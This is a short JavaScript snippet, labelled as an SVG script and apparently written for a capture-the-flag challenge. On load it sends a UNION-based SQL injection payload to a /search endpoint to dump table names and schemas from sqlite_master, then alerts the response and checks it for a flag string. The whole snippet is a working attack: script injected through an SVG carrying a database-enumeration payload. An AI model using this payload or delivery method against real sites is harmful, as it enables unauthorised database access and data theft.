svg.script:
async function triggerSqlInjection() {
  try {
    const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
    // Ensure the query is properly URL-encoded
    const encodedQuery = encodeURIComponent(sqlQuery);
    const searchResp = await fetch('/search?q=' + encodedQuery);
    const searchData = await searchResp.text();
    alert('SQLi Response: ' + searchData);
    if (searchData && searchData.includes('flag{')) { // Example flag format
        alert('FLAG LIKELY FOUND: ' + searchData);
    }
  } catch (e) {
    alert('Error triggering SQLi: ' + e.message);
  }
}
triggerSqlInjection();
